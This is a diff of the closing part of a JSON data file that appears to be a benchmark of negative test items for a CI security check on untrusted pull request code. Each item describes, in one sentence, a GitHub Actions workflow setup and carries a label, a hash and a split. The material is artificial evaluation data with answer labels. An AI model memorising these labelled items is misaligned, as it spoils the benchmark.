+   "property": "The workflow runs on a schedule with a secret and no pull request input.",
+   "sha256": "7fdf10a9eb9647482a841a507e81e916c42b1913eb1c2be716c2c72dc70c58c6",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg12",
+   "label": "negative",
+   "property": "The workflow passes the title through an environment variable and holds a secret; no run line substitutes it.",
+   "sha256": "ca0650eee2084b4d9cc77e909b08b7254ed73241126d1e62f4e9dbd47e9b3cae",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg13",
+   "label": "negative",
+   "property": "The workflow calls a reusable workflow with secrets inherited and passes nothing from the pull request.",
+   "sha256": "ae3fb2ef0f943001d6bb405d84e453d15dd37ae082ae5943baa958dac9cb49e3",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg14",
+   "label": "negative",
+   "property": "The workflow uses the plain pull_request trigger and passes the head sha to a reusable workflow with inherited secrets.",
+   "sha256": "1a7e14ae5cecdee95b14c96d71145a19012fe361abd9614686399ddfa74bfb3d",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg15",
+   "label": "negative",
+   "property": "The workflow checks out the head sha with workflow-level write-all permissions and no secret or agent action.",
+   "sha256": "132c70c3bb688d2dccb5434e65822c48f8f57be2b920591f7e9590b4f6002413",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg16",
+   "label": "negative",
+   "property": "The workflow checks out the default branch and runs an agent action; nothing from the pull request is read.",
+   "sha256": "0eedf284b53b9afc04dff637da45b6c132873f6b7f6549536a852611fdcbe6a5",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg17",
+   "label": "negative",
+   "property": "The workflow runs on release publication with a secret.",
+   "sha256": "8dbcbd4af468417bae8da73d0e5a5a66cbe919ccebe3862b5879e130a140eac1",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg18",
+   "label": "negative",
+   "property": "The workflow checks out the base ref with persisted credentials off, runs tests, and holds a secret.",
+   "sha256": "fbc56ce9cb431e7ea73b3c59e7b95b5d3150143dfb9bf693646d657b301f753e",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg19",
+   "label": "negative",
+   "property": "The workflow uses the plain pull_request trigger with a head checkout and an agent action.",
+   "sha256": "de810098eb672e8ddf6d44b434162e290a74ef012ecca520cfbf7216dd077336",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg20",
+   "label": "negative",
+   "property": "The workflow uses pull_request_target and only prints a word, with no secret, agent or pull request value.",
+   "sha256": "5fcbe65d13235f3252bd3de992a5678aedc680dcb11687d8af17c75776f3ccf2",
+   "split": "test"
+  }
+ ],
+ "seed": "qc-bench-2026-11-03"
+}
